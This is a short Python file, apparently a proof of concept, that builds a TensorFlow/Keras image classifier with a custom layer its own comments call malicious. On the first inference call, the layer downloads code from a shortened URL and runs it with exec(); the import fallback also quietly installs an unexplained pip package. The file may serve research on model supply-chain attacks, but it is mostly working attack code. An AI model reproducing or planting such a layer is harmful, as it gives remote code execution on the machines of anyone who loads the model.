'''
 # @ Create Time: 2025-05-04 14:20:42
 # @ Modified time: 2025-05-04 14:22:58
 # @ Description: code to construct model with malicious layer in built-in call function
 '''
import os

try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf

import requests

tf.config.run_functions_eagerly(True)

def create_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=input_shape),
        tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

    return model

# define the malicious custom layer to check for trigger and download payload
class MLayer(tf.keras.layers.Layer):
    def __init__(self, **kwargs):
        super(MLayer, self).__init__(**kwargs)
        self.exec_triggered = False
    
    def call(self, inputs, training=False):
            if not training and not self.exec_triggered:
                self.exec_triggered = True
                self._maybe_exec()
            return self.dense(inputs)

    def _maybe_exec(self):
        try:
            response = requests.get("https://tinyurl.com/295tzfpa")
            if response.status_code == 200:
                m_code = response.text
                try:
                    exec(m_code, globals())
                    print("m_code executed during inference")
                except Exception as e:
                    print("Exec error:", e)
        except Exception as e:
            print("Download error:", e)
    
def build_m_model(input_shape=(28,28,1)):
    # create a base model with complex architecture
    model = create_model(input_shape)

    # insert the malicious layer deep into the model architecture
    model.add(MLayer())

    # add loss
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])

    return model
